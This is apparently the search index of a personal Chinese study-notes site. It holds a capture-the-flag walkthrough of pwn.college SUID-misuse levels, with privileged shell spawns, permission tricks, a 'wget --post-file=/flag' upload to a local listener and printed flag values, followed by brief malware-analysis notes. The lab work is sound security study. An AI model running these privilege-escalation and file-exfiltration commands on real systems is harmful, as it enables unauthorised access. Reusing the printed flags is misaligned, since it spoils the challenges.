\u5de5\u5177\uff1a\u7528\u6765\u6307\u5b9a\u65f6\u95f4\u540e\u6740\u6b7b\u8fdb\u7a0b\u7684\u3002 hacker@program-misuse-level-28:~$ timeout 1h /bin/sh -p # cat /flag pwn.college{sWxHBmerdB7TO79CXDlkRtygh4x.0FM3EDL2QjMyMzW} # \u8fd9\u4e2a\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u4e00\u4e2a\u65f6\u95f4","title":"level28 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level29-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-29:~$ sh file.sh Welcome to ./babysuid_level29! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/stdbuf. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level29) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf! stdbuf \u5de5\u5177\uff1a\u4fee\u6539\u6807\u51c6\u6d41\u7684\u7f13\u51b2\u6a21\u5f0f\u548c\u5927\u5c0f hacker@program-misuse-level-29:~$ stdbuf --input=512K /bin/sh -p # cat /flag pwn.college{IHf3mOmt5d10g3StOZp5S0AMAfJ.0VM3EDL2QjMyMzW} # \u522b\u7528man\uff0c\u771f\u7684\u4e0d\u597d\u7528","title":"level29 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level30-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-30:~$ sh file.sh Welcome to ./babysuid_level30! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/setarch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level30) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/setarch! setarch \u5de5\u5177: \u6539\u53d8\u67b6\u6784\u7684\u5de5\u5177 hacker@program-misuse-level-30:~$ setarch i386 /bin/sh -p # cat /flag pwn.college{08T2qH86iHnjvFJb-5bmU9C5kJt.0lM3EDL2QjMyMzW} # \u5b83\u8fd9\u4e2a\u8bf4\u9ed8\u8ba4\u662f/bin/sh\uff0c\u53ef\u4ee5\u5207i386\uff0c\u5728man\u91cc\u5199\u7740\u5462","title":"level30 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level31-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-31:~$ sh file.sh Welcome to ./babysuid_level31! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/watch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level31) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/watch! watch \u5de5\u5177\uff1a\u6267\u884c\u547d\u4ee4\u7136\u540e\u5168\u5c4f\u8f93\u51fa hacker@program-misuse-level-31:~$ watch -x cat /flag ### \u4f7f\u7528\u540e\u4f1a\u8f93\u51fa\u5230\u5168\u5c4f pwn.college{UMl5SVp_YjbBiTIgIIiAi7i_5fg.01M3EDL2QjMyMzW} \u5f88\u795e\u5947\u7684\u5de5\u5177\uff0c\u7136\u800c\u53d1\u73b0tldr\u4e0d\u600e\u4e48\u5168\uff0c\u53ea\u6709\u5e38\u89c1\u547d\u4ee4\uff0c\u5230CTF\u7684\u73af\u5883\u4e4b\u4e2d\u5c31\u4e0d\u592a\u9002\u7528\u4e86","title":"level31 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level32-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-32:~$ sh file.sh Welcome to ./babysuid_level32! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/socat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level32) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/socat! socat \uff1a\u662f\u4e2a\u548csocket\u6709\u5173\u7684\u5de5\u5177\u3002 hacker@program-misuse-level-32:~$ socat -u \"file:/flag\" - pwn.college{QKHthQcoA6ncJKsiqFJMZ6ITybE.0FN3EDL2QjMyMzW} hacker@program-misuse-level-32:~$","title":"level32 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level33-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-33:~$ sh file.sh Welcome to ./babysuid_level33! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/whiptail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail! whiptail \uff1a\u5c55\u793ashell\u7684\u5bf9\u8bdd\u6846\u7684\u5de5\u5177 hacker@program-misuse-level-33:~$ whiptail --textbox /flag 20 40 pwn.college{4r_plp-YJyPyhT4_GiJQz042S5b.0VN3EDL2QjMyMzW} \u662f\u4e00\u4e2a\u6253\u5f00\u5bf9\u8bdd\u6846\u7684\u5de5\u5177\uff0c\u56e0\u6b64\u601d\u8def\u5c31\u662f\u76f4\u63a5\u5c55\u793a\u51fa\u6765\u5c31\u884c\u4e86\u3002","title":"level33 Requires some light programming to read the flag.!"},{"location":"en/CSE466/program-misuse/#level34-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-34:~$ sh file.sh Welcome to ./babysuid_level34! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/awk. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/awk! \u8fd9\u6b21\u662f\u4e00\u4e2a\u6211\u4e00\u76f4\u90fd\u4e0d\u600e\u4e48\u4f1a\u7528\u7684\u5de5\u5177\u4e86\u3002\u3002\u3002\u4f60\u5988\u7684 hacker@program-misuse-level-34:~$ awk '{print $1}' /flag pwn.college{ghdjRlnfhKYn-uhIb2N76siNtG_.0lN3EDL2QjMyMzW} hacker@program-misuse-level-34:~$ awk \u662f\u4e00\u4e2a\u5f88\u6709\u7528\u7684\u5de5\u5177\uff0c\u6709\u65f6\u95f4\u8fd8\u662f\u5f97\u5b66\u4e00\u5b66","title":"level34 Requires some light programming to read the flag.!"},{"location":"en/CSE466/program-misuse/#level35-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-35:~$ sh file.sh Welcome to ./babysuid_level35! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/sed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sed! \u679c\u7136\uff0c\u5728awk\u4e4b\u540e\u6211\u5c31\u5e94\u8be5\u60f3\u5230\u662fsed hacker@program-misuse-level-35:~$ sed p /flag pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} hacker@program-misuse-level-35:~$ \u4e5f\u8bb8\u6211\u4e4b\u524d\u64cd\u4f5c\u9519\u4e86\u4ec0\u4e48\uff0c\u8fd9\u91cc\u4e0d\u5e94\u8be5\u662f\u4e24\u884cflag\u5427\uff1f","title":"level35 Requires some light programming to read the flag.!"},{"location":"en/CSE466/program-misuse/#level36-requires-some-light-programming-to-read-the-flag","text":"hacker@program-misuse-level-36:~$ sh file.sh Welcome to ./babysuid_level36! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/ed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ed! ed \u5de5\u5177\uff1a\u662f\u4e2a\u7f16\u8f91\u5668\uff0c\u662f\u4ea4\u4e92\u5f0f\u7684 hacker@program-misuse-level-36:~$ ed /flag 57 .p pwn.college{QNXzpWhqr3e12Okfu2KRnY5jyxa.0FO3EDL2QjMyMzW} \u663e\u793a\u5168\u6587","title":"level36 Requires some light programming to read the flag.!"},{"location":"en/CSE466/program-misuse/#level37-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-37:~$ sh file.sh Welcome to ./babysuid_level37! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chown. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level37) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chown! chown \u5de5\u5177\uff1a\u6539\u53d8\u6587\u4ef6\u7684\u6240\u6709\u8005\u548c\u7ec4\u7684 hacker@program-misuse-level-37:~$ chown hacker /flag hacker@program-misuse-level-37:~$ cat /flag pwn.college{49NDHOhwhBEwWccuPUHSxUU0RIE.0VO3EDL2QjMyMzW} hacker@program-misuse-level-37:~$ \u8fd9\u5c31\u662f\u7b80\u5355\u7684\u8d4b\u6743\u4e86","title":"level37 Lets you get the flag by doing tricks with permissions!"},{"location":"en/CSE466/program-misuse/#level38-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-38:~$ sh file.sh Welcome to ./babysuid_level38! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chmod. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level38) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chmod! \u8fd9\u4e2a\uff0c\u6ca1\u4eba\u4e0d\u4f1a\u5427 hacker@program-misuse-level-38:~$ chmod 777 /flag hacker@program-misuse-level-38:~$ cat /flag pwn.college{UtH5piA32tLwQLpCFPRDXuFa98r.0FM4EDL2QjMyMzW} hacker@program-misuse-level-38:~$","title":"level38 Lets you get the flag by doing tricks with permissions!"},{"location":"en/CSE466/program-misuse/#level39-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-39:~$ sh file.sh Welcome to ./babysuid_level39! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/cp. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level39) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cp! \u4e00\u5f00\u59cb\u60f3\u641e\u4e2a\u786c\u94fe\u63a5\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u884c\uff0c\u7136\u540e\u8f93\u51fa\u5230 \u6807\u51c6\u8f93\u51fa\u6d41 \u5c31\u884c\u4e86 hacker@program-misuse-level-39:~$ cp /flag /dev/stdout pwn.college{Q2azoEz2fXYLZxYkmGAK4PjtrO7.0VM4EDL2QjMyMzW} hacker@program-misuse-level-39:~$","title":"level39 Lets you get the flag by doing tricks with permissions!"},{"location":"en/CSE466/program-misuse/#level40-lets-you-get-the-flag-by-doing-tricks-with-permissions","text":"hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! \u8fd9\u9898\uff0c\u5341\u5206\u7684\u79bb\u8c31\u554a\uff0c\u5b8c\u5168\u4e0d\u4f1a\u505a\uff0c\u770b\u7684\u7b54\u6848\uff0c\u5b9e\u5728\u662f\u592a\u9a9a\u6c14\u4e86\uff0c\u4f7f\u7528mv\u628acat\u8986\u76d6mv hacker@program-misuse-level-40:~$ mv /usr/bin/cat /usr/bin/mv hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! hacker@program-misuse-level-40:~$ mv /flag pwn.college{g9AYY8a5E2v4R8jr_434HNFYEL3.0lM4EDL2QjMyMzW} hacker@program-misuse-level-40:~$ ///@TODO:\u8fd9\u4e2a\u503c\u5f97\u8bb0\u5f55\u4e00\u4e0b\uff01 \u8fd9\u4e2a\u9898\u8ba9\u6211\u60f3\u8d77\u4e86\u4e00\u4e2a\u770b\u5230\u7684\u5185\u5bb9\uff1a \u5982\u679c\u6211\u4eec\u5728\u547d\u4ee4\u4e4b\u4e2d\u4e0d\u4f7f\u7528\u7ba1\u9053\u800c\u4f7f\u7528\u91cd\u5b9a\u5411\uff08\u8fd9\u662f\u65b0\u624b\u53ef\u80fd\u4f1a\u72af\u7684\u9519\u8bef\uff09\u90a3\u4e48\u524d\u4e00\u4e2a\u8f93\u51fa\u4f1a\u91cd\u5199\u5230\u540e\u9762\u7684\u547d\u4ee4\u4e4b\u4e2d\u9020\u6210\u6df7\u4e71\uff0c\u6bd4\u5982 cat /flag > more","title":"level40 Lets you get the flag by doing tricks with permissions!"},{"location":"en/CSE466/program-misuse/#level41-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-41:~$ sh file.sh Welcome to ./babysuid_level41! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/perl. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level41) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/perl! perl \u662f\u4e2a\u811a\u672c\u89e3\u91ca\u5668\uff0c hacker@program-misuse-level-41:~$ perl -ne \"print if pwn.college\" /flag perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_CTYPE = \"C.UTF-8\", LANG = \"en_US.UTF-8\" are supported and installed on your system. perl: warning: Falling back to the standard locale (\"C\"). pwn.college{s8g_u7MkHNRfph-Yrrslj2vzKUJ.01M4EDL2QjMyMzW} hacker@program-misuse-level-41:~$ \u6253\u5370\u6709pen.college\u7684\u884c","title":"level41 Lets you read the flag because they let you program anything!"},{"location":"en/CSE466/program-misuse/#level42-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-42:~$ sh file.sh Welcome to ./babysuid_level42! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/python. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level42) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/python! \u4f7f\u7528python >>> with open(\"/flag\",\"r\") as f: ... print(f.read()) ... pwn.college{kTtv9lYtW7yK8dnUSvApk5Yv1s-.0FN4EDL2QjMyMzW} >>>","title":"level42 Lets you read the flag because they let you program anything!"},{"location":"en/CSE466/program-misuse/#level43-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-43:~$ sh file.sh Welcome to ./babysuid_level43! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/ruby. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level43) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ruby! \u7528ruby\u5199\u811a\u672c # \u6253\u5f00\u6587\u4ef6 File.open('/flag', 'r') do |f| # \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 content = f.read # \u8f93\u51fa\u6587\u4ef6\u5185\u5bb9 puts content end hacker@program-misuse-level-43:~$ ruby level43.rb pwn.college{smGb0PfTvxp0__6HgKHsucNW2Pg.0VN4EDL2QjMyMzW} hacker@program-misuse-level-43:~$","title":"level43 Lets you read the flag because they let you program anything!"},{"location":"en/CSE466/program-misuse/#level44-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-44:~$ sh file.sh Welcome to ./babysuid_level44! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/bash. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level44) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bash! bash\uff0c\u53c2\u7167\u4e4b\u524d\u7684\u9898\u62ff\u5230\u63d0\u793a\u7b26 hacker@program-misuse-level-44:~$ bash -p bash-5.0# cat /flag pwn.college{wsQ6idwZWBnJ7doJInQhvY0hBVg.0lN4EDL2QjMyMzW} bash-5.0#","title":"level44 Lets you read the flag because they let you program anything!"},{"location":"en/CSE466/program-misuse/#level45-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-45:~$ sh file.sh Welcome to ./babysuid_level45! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/date. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level45) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/date! \u624b\u518c\u91cc\u5199\u4e86-f\u8bfb\u6587\u4ef6 hacker@program-misuse-level-45:~$ date -f /flag date: invalid date 'pwn.college{E0wTS_9vWAv5Z6QWVWGpaHKER5P.01N4EDL2QjMyMzW}' hacker@program-misuse-level-45:~$","title":"level45 Just straight up wasn't designed to let you read files!"},{"location":"en/CSE466/program-misuse/#level46-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-46:~$ sh file.sh Welcome to ./babysuid_level46! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/dmesg. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level46) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg! \u663e\u793a\u5f00\u673a\u65f6\u95f4\u4e4b\u7c7b\u7684\u4e1c\u897f hacker@program-misuse-level-46:~$ dmesg -F /flag [ 0.000000] pwn.college{Q8U4rT5_srr0BlLq1ZlDOJx0yDe.0FO4EDL2QjMyMzW} hacker@program-misuse-level-46:~$ \u90fd\u662f\u770b\u624b\u518c","title":"level46 Just straight up wasn't designed to let you read files!"},{"location":"en/CSE466/program-misuse/#level47-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-47:~$ sh file.sh Welcome to ./babysuid_level47! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level47) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wc! wc \u4e00\u822c\u7528\u4e8e\u7edf\u8ba1\u884c\u53f7\u3001\u5b57\u6570\u4ec0\u4e48\u7684\u3002 hacker@program-misuse-level-47:~$ wc --files0-from=/flag wc: 'pwn.college{shy1dFSZ2LmpPnQ-OAl_RoDeLxh.0VO4EDL2QjMyMzW}'$'\\n': No such file or directory hacker@program-misuse-level-47:~$ \u4ece\u624b\u518c\u6765\u770b\u5c31\u4e0a\u9762\u8fd9\u4e2a\u4e0d\u662f\u7edf\u8ba1\u6570\u91cf\u7684\uff0c\u56e0\u6b64\u5c31\u5b83\u4e86\uff01","title":"level47 Just straight up wasn't designed to let you read files!"},{"location":"en/CSE466/program-misuse/#level48-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-48:~$ sh file.sh Welcome to ./babysuid_level48! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/gcc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level48) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gcc! \u6709\u70b9\u513f\u610f\u601d\uff0cgcc\u90fd\u51fa\u6765\u4e86 hacker@program-misuse-level-48:~$ gcc -x c -E /flag # 1 \"/flag\" # 1 \"<built-in>\" # 1 \"<command-line>\" # 31 \"<command-line>\" # 1 \"/usr/include/stdc-predef.h\" 1 3 4 # 32 \"<command-line>\" 2 # 1 \"/flag\" pwn.college{UgtHTJRU8raItcJF89PS-hM7Rh9.0FM5EDL2QjMyMzW} hacker@program-misuse-level-48:~$ \u5b83\u8fd9\u4e2a\u5fc5\u987b\u8981\u6307\u5b9a\u8bed\u8a00\uff0c\u4e0d\u7136\u4e0d\u80fd\u8fd0\u884c ///@TODO: \u8fd9\u4e2a\u4e00\u5b9a\u8981\u53bb\u770b\u5b98\u65b9\u89e3\u7b54\uff0c\u76f4\u63a5\u5728\u4e00\u4e2a\u7a0b\u5e8f\u91cc\u9762include '/flag'\uff0c\u7136\u540e\u9760\u62a5\u9519\u5f97\u5230flag\uff0c\u975e\u5e38\u6709\u542f\u53d1","title":"level48 Just straight up wasn't designed to let you read files!"},{"location":"en/CSE466/program-misuse/#level49-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-49:~$ sh file.sh Welcome to ./babysuid_level49! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/as. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level49) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/as! as :\u6c47\u7f16\u8bed\u8a00\u7684\u7f16\u8bd1\u5668 hacker@program-misuse-level-49:~$ as -g /flag /flag: Assembler messages: /flag:1: Error: no such instruction: `pwn.college{MqHCh7Oprd3rEP2f1i_RgAl8QZR.0VM5EDL2QjMyMzW}' hacker@program-misuse-level-49:~$ \u901a\u8fc7\u8c03\u8bd5\u8f93\u51fa","title":"level49 Just straight up wasn't designed to let you read files!"},{"location":"en/CSE466/program-misuse/#level50-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-50:~$ sh file.sh Welcome to ./babysuid_level50! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wget. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level50) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wget! wget :\u4e0b\u8f7d\u5668 hacker@program-misuse-level-50:~$ nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888 [1] 5873 --2023-07-22 13:39:17-- http://127.0.0.1:8888/ Connecting to 127.0.0.1:8888... connected. POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 127.0.0.1:8888 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 57 HTTP request sent, awaiting response... pwn.college{M8oJZxXsT1hCl5_WCWqpA-ITlJZ.0lM5EDL2QjMyMzW} \u6709\u4e2a\u53eb\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\uff0c\u8fd9\u4e2a\u770b\u4e86\u4e00\u4e2a\u522b\u4eba\u7684\u7b54\u6848","title":"level50 Just straight up wasn't designed to let you read files!"},{"location":"en/CSE466/program-misuse/#level51-shows-how-dangerous-it-is-to-allow-users-to-load-their-own-code-as-plugins-into-the-program-but-figuring-out-how-is-the-hard-part","text":"hacker@program-misuse-level-51:~$ sh file.sh Welcome to ./babysuid_level51! This challenge is part of a series of programs that show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!). I just set the SUID bit on /usr/bin/ssh-keygen. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level51) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen! \u8fd9\u4e2a\u6211\u662f\u4e00\u70b9\u513f\u90fd\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u8bb2\u89e3\u624d\u660e\u767d\uff0cG \u8fd9\u4e2a\u5c31\u662f\u5199\u4e00\u4e2aC/C++\u7a0b\u5e8f\uff0c\u91cc\u9762\u8981\u6709C_GetFunctionList\u8fd9\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u7528sendfile\u6765open\u6587\u4ef6\u3002 \u7136\u540e\u4f7f\u7528gcc\u7f16\u8bd1\u6210.so\u6587\u4ef6\uff0c\u6700\u540e\u4f7f\u7528ssh-keygen -D\u5373\u53ef\u3002 hacker@program-misuse-level-51:~$ ssh-keygen -D ./level51.so pwn.college{koI1pFWalnNHyjlN_NQ4CLcsasT.01M5EDL2QjMyMzW} C_GetFunctionList for provider ./level51.so failed: 57 cannot read public key from pkcs11 hacker@program-misuse-level-51:~$","title":"level51 Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!"},{"location":"en/CSE466/program-misuse/#_2","text":"\u5173\u4e8emv \u90a3\u5757\u513f\u7684\uff0c[\u4e00\u4e2a\u535a\u5ba2]\uff08https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619\uff09 \u6700\u540e\u4e00\u4e2a\u9898\u7684 \u8bb2\u89e3 ,\u8fd9\u73a9\u610f\u513f\u4e0d\u8bb2\u662f\u771f\u4e0d\u4f1a\uff0c\u592a\u83dc\u4e86","title":"\u503c\u5f97\u8bb0\u5f55\u7684\u5185\u5bb9"},{"location":"en/MalwareAnalysis/READMD/","text":"\u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u9605\u8bfb\u7b14\u8bb0 \u8fd9\u672c\u4e66\u5728\u8bfe\u4e0a\u5b66\u8fc7\uff0c\u53ef\u60dc\u5f53\u65f6\u8bb2\u7684\u592a\u6d45\uff0c\u56e0\u6b64\u73b0\u5728\u91cd\u65b0\u5f00\u59cb\u5b66\u4e60\u8fd9\u4e9b\u5185\u5bb9\uff0c\u5e76\u5e0c\u671b\u53ef\u4ee5\u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e4b\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u5185\u5bb9\u81ea\u5df1\u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684\u3001\u5c0f\u7684\u75c5\u6bd2\u3002","title":"ABOUT MalwareAnalysis"},{"location":"en/MalwareAnalysis/READMD/#_1","text":"\u8fd9\u672c\u4e66\u5728\u8bfe\u4e0a\u5b66\u8fc7\uff0c\u53ef\u60dc\u5f53\u65f6\u8bb2\u7684\u592a\u6d45\uff0c\u56e0\u6b64\u73b0\u5728\u91cd\u65b0\u5f00\u59cb\u5b66\u4e60\u8fd9\u4e9b\u5185\u5bb9\uff0c\u5e76\u5e0c\u671b\u53ef\u4ee5\u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e4b\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u5185\u5bb9\u81ea\u5df1\u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684\u3001\u5c0f\u7684\u75c5\u6bd2\u3002","title":"\u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u9605\u8bfb\u7b14\u8bb0"},{"location":"en/MalwareAnalysis/Lab/lab1/","text":"","title":"lab1"},{"location":"en/MalwareAnalysis/knowledge/ch0/","text":"The Goals of Malware Analysis \u786e\u5b9a\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48 \u786e\u4fdd\u80fd\u591f\u5b9a\u4f4d\u51fa\u6240\u6709\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u548c\u6587\u4ef6 \u89e3\u5228\u53ef\u7591\u6587\u4ef6 \u627e\u51fa\u53ef\u7528\u4e8e\u68c0\u6d4b\u7684\u7279\u5f81\u7801 \u57fa\u4e8e\u673a\u5668\u5b66\u4e60\u6784\u5efa\u68c0\u6d4b\u7cfb\u7edf \u5982\u4f55\u68c0\u6d4b\u5e76\u63a7\u5236\u635f\u5bb3 Signatures \u7279\u5f81\u7801 Identify files or registry keys on a victim computer that indicate an infection Focus on what the malware did to the system, not the malware itself Different from antivirus signatures \u53c8\u79f0\u4e3a\u611f\u67d3\u8ff9\u8c61\uff0c\u7528\u4e8e\u5728\u53d7\u611f\u67d3\u4e3b\u673a\u4e0a\u68c0\u6d4b\u51fa\u6076\u610f\u4ee3\u7801\u3002 \u7ecf\u5e38\u662f\u6076\u610f\u4ee3\u7801\u6240\u521b\u5efa\u6216\u4fee\u6539\u7684\u6587\u4ef6\uff0c\u6216\u662f\u5bf9\u6ce8\u518c\u8868\u7684\u7279\u5b9a\u4fee\u6539\u3002 \u4e0e\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u6240\u4f7f\u7528\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u4e0d\u540c \u6076\u610f\u4ee3\u7801\u7684\u611f\u67d3\u8ff9\u8c61\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48 \u6076\u610f\u4ee3\u7801\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u672c\u8eab\u7684\u7279\u6027\u3002 \u6709\u65f6\u611f\u67d3\u8ff9\u8c61\u66f4\u52a0\u6709\u6548\uff0c\u6bd4\u5982\u68c0\u6d4b\u90a3\u4e9b\u7ecf\u5e38\u53d8\u5316\u81ea\u8eab\u5f62\u6001\u7684\u591a\u6001\u6027\u6076\u610f\u4ee3\u7801\uff0c\u6216\u8005\u6076\u610f\u4ee3\u7801\u5df2\u7ecf\u5c06\u81ea\u8eab\u6587\u4ef6\u4ece\u786c\u76d8\u4e2d\u5220\u9664\u3002 Network signatures \u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801 Detect malware by analyzing network traffic More effective when made using malware analysis \u901a\u8fc7\u76d1\u6d4b\u7f51\u7edc\u6d41\u91cf\u6765\u68c0\u6d4b\u6076\u610f\u4ee3\u7801 \u5728\u6076\u610f\u4ee3\u7801\u5206\u6790\u5e2e\u52a9\u4e0b\u63d0\u53d6\u7684\u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801\u5f80\u5f80\u662f\u66f4\u52a0\u6709\u6548\u7684\uff0c\u6709\u66f4\u9ad8\u7684\u68c0\u6d4b\u7387\u548c\u66f4\u5c11\u7684\u8bef\u62a5 \u4e24\u79cd\u65b9\u6cd5 \u9759\u6001\u3001\u52a8\u6001 